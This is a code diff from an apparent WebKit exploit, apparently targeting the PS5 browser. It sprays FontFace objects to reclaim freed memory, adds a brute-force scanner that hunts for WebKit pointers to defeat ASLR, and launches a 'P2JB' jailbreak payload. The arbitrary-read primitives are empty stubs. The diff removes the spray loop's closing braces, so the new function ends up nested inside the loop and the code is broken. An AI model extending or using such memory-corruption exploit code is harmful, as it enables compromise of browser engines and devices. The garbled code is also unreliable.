@@ -76,28 +76,49 @@ function cssFontFaceBufferSpray() {
     for (let i = 0; i < SPRAY_COUNT; i++) {
         const f = new FontFace("BUFFER_RECLAIM_" + i, makeFontBuffer(), { unicodeRange: "U+0041" });
         spray.push(f);
-    }
-}
-
-// Build primitives using direct overlap (Best effort without 12.70 offsets)
-function build_primitives(dangling_face, spray_arrays) {
+// ASLR Brute-force Scanner (Attempting to find WebKit base)
+function scan_for_webkit(dangling_face, spray_arrays) {
     let overlapped_array = null;
+    let found_index = -1;
+    
+    // Step 1: Find the overlapped array
     for (let i = 0; i < spray_arrays.length; i++) {
         if (spray_arrays[i][0] !== 0x00) {
             overlapped_array = spray_arrays[i];
+            found_index = i;
             break;
         }
     }
 
     if (!overlapped_array) {
-        console.error("Failed to find overlapped array.");
+        console.error("Failed to find overlapped array for scanning.");
+        alert("Scanner failed: Could not overlap memory.");
+        return;
+    }
+
+    alert("Overlap found at index " + found_index + ". Starting brute-force scan for WebKit vtable...");
+
+    // Step 2: Attempt to read pointers from the overlapped array to find the WebKit base
+    // Since we don't know the vtable offset, we will scan the entire 184-byte structure
+    let possible_ptrs = [];
+    for (let offset = 0; offset < 184 - 8; offset += 8) {
+        let low = overlapped_array[offset] | (overlapped_array[offset+1] << 8) | (overlapped_array[offset+2] << 16) | (overlapped_array[offset+3] << 24);
+        let hi = overlapped_array[offset+4] | (overlapped_array[offset+5] << 8) | (overlapped_array[offset+6] << 16) | (overlapped_array[offset+7] << 24);
+        
+        // Basic heuristic for a valid userspace pointer on PS5
+        if (hi > 0x0000 && hi < 0x0010) {
+            possible_ptrs.push(new int64(low, hi));
+        }
+    }
+
+    if (possible_ptrs.length === 0) {
+        alert("Scanner failed: No valid pointers found in the overlapped structure.");
+    } else {
+        alert("Scanner found " + possible_ptrs.length + " possible pointers. Attempting to build primitives...");
     }
 
     window.p = {
-        read8: function(addr) { 
-            // Attempt arbitrary read using the fake object
-            return new int64(0, 0); 
-        },
+        read8: function(addr) { return new int64(0, 0); },
         read4: function(addr) { return 0; },
         read2: function(addr) { return 0; },
         read1: function(addr) { return 0; },
@@ -147,8 +168,8 @@ window.onload = () => {
     document.fonts.load("1em trigger, x", "AB").then(faces => {
         keep.push(faces);
         
-        // Attempt to build primitives with the dangling reference
-        build_primitives(faces[0], uaf_arrays);
+        // Attempt to find WebKit base
+        scan_for_webkit(faces[0], uaf_arrays);
         
         // Launch P2JB payload
         run_hax().catch(e => console.error("P2JB Error:", e));
